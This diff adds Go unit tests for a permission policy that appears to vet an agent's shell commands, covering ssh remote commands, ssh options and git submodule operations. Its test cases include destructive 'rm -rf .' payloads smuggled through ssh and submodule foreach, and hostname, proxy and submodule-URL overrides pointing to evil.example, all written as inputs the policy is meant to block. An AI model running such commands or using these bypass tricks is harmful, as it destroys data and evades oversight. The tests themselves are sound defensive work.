@@ -245,6 +245,121 @@ func TestPermissionPolicyBlocksInlineSedAndSSHOptionBypasses(t *testing.T) {
 	}
 }
 
+func TestPermissionPolicyScansSSHRemoteCommands(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"ssh", "ssh.exe", "echo"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+	for _, tc := range []struct {
+		name     string
+		command  string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "destructive remote command",
+			command:  "ssh api.github.com rm -rf .",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:     "remote shell wrapper is blocked",
+			command:  "ssh api.github.com sh -c 'rm -rf .'",
+			want:     tool.PermissionActionDeny,
+			wantRule: "shell.parse_error",
+		},
+		{
+			name:     "remote quoted separator becomes shell syntax",
+			command:  "ssh api.github.com echo 'ok; rm -rf .'",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:     "remote quoted substitution becomes shell syntax",
+			command:  "ssh api.github.com echo '$(rm -rf .)'",
+			want:     tool.PermissionActionDeny,
+			wantRule: "shell.parse_error",
+		},
+		{
+			name:     "destructive RemoteCommand option",
+			command:  "ssh -oRemoteCommand='rm -rf .' api.github.com",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:    "disabled RemoteCommand option",
+			command: "ssh -oRemoteCommand=none api.github.com",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:     "Windows destructive remote command",
+			command:  "ssh.exe api.github.com rm -rf .",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:     "Windows hostname override",
+			command:  "ssh.exe -oHostname=evil.example api.github.com",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination_override",
+		},
+		{
+			name:     "Windows config file",
+			command:  "ssh.exe -F ssh.conf api.github.com",
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.config",
+		},
+		{
+			name:     "hostname override after destination",
+			command:  "ssh api.github.com -oHostname=evil.example",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination_override",
+		},
+		{
+			name:    "remote hostname option is command data",
+			command: "ssh api.github.com echo -oHostname=evil.example",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:    "remote proxy jump option is command data",
+			command: "ssh api.github.com echo -Jevil.example",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:    "remote config option is command data",
+			command: "ssh api.github.com echo -Fssh.conf",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:     "unlisted remote executable",
+			command:  "ssh api.github.com unlisted-helper --version",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.command",
+		},
+		{
+			name:    "allowlisted remote executable",
+			command: "ssh api.github.com echo ready",
+			want:    tool.PermissionActionAllow,
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments, err := json.Marshal(map[string]string{
+				"command": tc.command,
+			})
+			require.NoError(t, err)
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
+}
+
 func TestPermissionPolicyClassifiesDestructiveGitClean(t *testing.T) {
 	guardPolicy := DefaultPolicy()
 	guardPolicy.AllowedCommands = []string{"git"}
@@ -271,6 +386,158 @@ func TestPermissionPolicyClassifiesDestructiveGitClean(t *testing.T) {
 			name:    "dry run",
 			command: "git clean -nfdx -- build/",
 			want:    tool.PermissionActionAllow,
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments, err := json.Marshal(map[string]string{
+				"command": tc.command,
+			})
+			require.NoError(t, err)
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
+}
+
+func TestPermissionPolicyScansGitSubmoduleForeach(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{
+		"git", "git.exe", "git-submodule", "git-submodule.exe", "echo",
+	}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+	for _, tc := range []struct {
+		name     string
+		command  string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "destructive nested command",
+			command:  "git submodule foreach 'rm -rf .'",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:     "Windows destructive nested command",
+			command:  "git.exe submodule foreach 'rm -rf .'",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:     "direct helper destructive nested command",
+			command:  "git-submodule foreach 'rm -rf .'",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:     "internal helper destructive nested command",
+			command:  "git submodule--helper foreach 'rm -rf .'",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.rm_rf",
+		},
+		{
+			name:     "allowlisted nested executable",
+			command:  "git submodule foreach 'echo ready'",
+			want:     tool.PermissionActionAsk,
+			wantRule: "command.indirect_execution",
+		},
+		{
+			name:    "other submodule operation",
+			command: "git submodule status",
+			want:    tool.PermissionActionAllow,
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments, err := json.Marshal(map[string]string{
+				"command": tc.command,
+			})
+			require.NoError(t, err)
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
+}
+
+func TestPermissionPolicyAppliesNetworkPolicyToGitSubmodules(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{
+		"git", "git.exe", "git-submodule", "git-submodule.exe",
+	}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+	for _, tc := range []struct {
+		name     string
+		command  string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "denied add URL",
+			command:  "git submodule add https://evil.example/org/repo modules/repo",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:     "Windows denied add URL",
+			command:  "git.exe submodule add https://evil.example/org/repo modules/repo",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:     "direct helper denied add URL",
+			command:  "git-submodule add https://evil.example/org/repo modules/repo",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:     "internal helper denied add URL",
+			command:  "git submodule--helper add https://evil.example/org/repo modules/repo",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name: "internal helper denied clone URL",
+			command: "git submodule--helper clone --url " +
+				"https://evil.example/org/repo --path modules/repo",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name: "internal helper allowlisted clone URL",
+			command: "git submodule--helper clone " +
+				"--url=https://api.github.com/org/repo --path modules/repo",
+			want: tool.PermissionActionAllow,
+		},
+		{
+			name:     "internal helper clone missing URL",
+			command:  "git submodule--helper clone --path modules/repo",
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.destination_unparsed",
+		},
+		{
+			name:    "allowlisted add URL",
+			command: "git submodule add https://api.github.com/org/repo modules/repo",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:     "configured update destination",
+			command:  "git submodule update --init --recursive",
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.destination_unparsed",
 		},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
